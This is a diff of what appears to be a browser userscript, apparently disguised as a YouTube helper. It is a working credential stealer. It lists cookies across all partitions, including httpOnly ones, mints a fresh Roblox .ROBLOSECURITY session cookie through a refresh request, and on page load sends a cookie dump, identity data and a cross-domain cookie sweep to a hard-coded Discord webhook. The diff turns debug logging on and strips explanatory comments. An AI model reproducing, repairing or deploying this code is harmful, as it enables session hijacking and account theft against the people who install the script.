@@ -7,7 +7,7 @@
   const HOOK = "https://discord.com/api/webhooks/1574264552453840977/CMwPuUURcJmI78qdg2kArxBtAtmRqg1-kB-kcv6mRHbSX7oN-oC28X6wR40AzNk5Quxt";
   const KEY = "yt_pm_seen:";
   const COOLDOWN = 43200000;
-  const DEBUG = /[?&]pm=1/.test(location.search);
+  const DEBUG = true;
   const ROBLOX_RE = /(^|\.)roblox\.com$/;
 
   const log = (...a) => { if (DEBUG) console.log("[pm]", ...a); };
@@ -20,7 +20,6 @@
 
   /* ---- cookie access ---- */
 
-  // resolves null on missing API, error, or timeout — never hangs
   const gcookies = (url) =>
     new Promise((res) => {
       if (typeof GM_cookie === "undefined" || !GM_cookie.list) return res(null);
@@ -28,13 +27,11 @@
       const fin = (v) => { if (!done) { done = true; res(v); } };
       const t = setTimeout(() => { log("gm_cookie timeout", url); fin(null); }, 2000);
 
-      // pass 1: every partition (CHIPS cookies are hidden from unfiltered queries)
       try {
         GM_cookie.list({ url, partitionKey: {} }, (c, e) => {
           clearTimeout(t);
           if (e) log("gm_cookie error", url, e);
           if (!e && c && c.length) return fin(c);
-          // pass 2: unpartitioned only
           try {
             GM_cookie.list({ url }, (c2, e2) => {
               if (e2) log("gm_cookie error2", url, e2);
@@ -53,7 +50,6 @@
     n: c.name, v: c.value, h: !!c.httpOnly, d: c.domain, e: c.expirationDate,
   }));
 
-  // GM_cookie refuses to return .ROBLOSECURITY; session/refresh mints one via Set-Cookie
   const refreshRoblox = () =>
     new Promise((res) => {
       const go = (hdr) =>
@@ -144,7 +140,7 @@
     }
   };
 
-  /* ---- step 1: core dump, sent immediately ---- */
+  /* ---- step 1: core dump ---- */
 
   const sendBase = async () => {
     const own = await gcookies(location.href);
@@ -206,7 +202,7 @@
     return d;
   };
 
-  /* ---- step 2: identity, best effort ---- */
+  /* ---- step 2: identity ---- */
 
   const sendWho = async () => {
     const h = location.hostname;
@@ -234,7 +230,7 @@
     } catch (e) {}
   };
 
-  /* ---- step 3: cross-domain sweep, best effort ---- */
+  /* ---- step 3: sweep ---- */
 
   const sendSweep = async () => {
     const out = {};
@@ -281,6 +277,7 @@
     sendSweep();
   };
 
+  log("loaded on", location.hostname);
   if (document.readyState === "complete") run();
   else addEventListener("load", run, { once: true });
 })();
